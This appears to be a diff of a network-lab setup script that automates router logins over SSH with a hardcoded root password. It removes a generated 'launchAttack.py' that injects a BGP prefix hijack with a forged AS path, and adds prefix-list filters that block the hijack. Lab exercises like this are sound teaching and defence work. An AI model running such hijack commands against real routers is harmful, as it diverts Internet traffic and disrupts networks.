@@ -1,6 +1,6 @@
-ifconfig eth0 inet 202.43.176.6/30
+ifconfig eth0 inet 200.2.0.6/30
 
-route add default gw 202.43.176.5
+route add default gw 200.2.0.5
 
 service ssh start
 
@@ -12,20 +12,20 @@ service ssh restart
 
 ssh-keygen
 
-ssh-copy-id root@202.43.176.5
+ssh-copy-id root@200.2.0.5
 
 printf "import paramiko \nfrom getpass import getpass \nimport time \
-\nhost = \"202.43.176.5\" \nport = 22 \nusername = \"root\" \npassword = \"kathara\" \
+\nhost = \"200.2.0.5\" \nport = 22 \nusername = \"root\" \npassword = \"kathara\" \
 \nremote_conn_pre = paramiko.SSHClient() \
 \nremote_conn_pre.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \
 \nremote_conn_pre.connect(host, port=22, username=username, password=password, look_for_keys=False, allow_agent=False) \
 \nremote_conn = remote_conn_pre.invoke_shell() \
 \noutput = remote_conn.recv(65535) \
 \nprint(output.decode(\"utf-8\")) \
-\nattack_commands = [\'vtysh%s', \'conf t%s', \'router bgp 8%s', \'network 200.7.0.0/24%s', \'ip route 200.7.0.0 255.255.255.0 216.239.32.1%s', \'access-list 10 permit 200.7.0.0 255.255.255.0%s', \'route-map toMY-ISP permit 10%s', \'match ip address 10%s', \'set as-path prepend 8 5 1 2%s', \'exit%s', \'router bgp 8%s', \'neighbor 216.239.32.1 route-map toMY-ISP out%s', \'exit%s', \'do clear ip bgp *%s'] \
+\nattack_commands = [\'vtysh%s', \'conf t%s', \'router bgp 2%s', \'neighbor 195.11.14.1 prefix-list partialInRouter1 in%s', \'ip prefix-list partialInRouter1 deny 200.7.0.0/17 ge 32%s', \'router bgp 2%s', \'neighbor 200.2.0.2 prefix-list partialInRouter3 in%s', \'ip prefix-list partialInRouter3 deny 200.7.0.0/17 ge 32%s', \'do clear ip bgp *%s', \'exit%s'] \
 \n
 \nfor attack_command in attack_commands: \
 \n    remote_conn.send(attack_command) \
 \n    time.sleep(.5) \
 \n    output = remote_conn.recv(65535) \
-\n    print(output.decode(\"utf-8\")) " "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" >> launchAttack.py
+\n    print(output.decode(\"utf-8\")) " "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" "\n" >> routeFilterScript.py
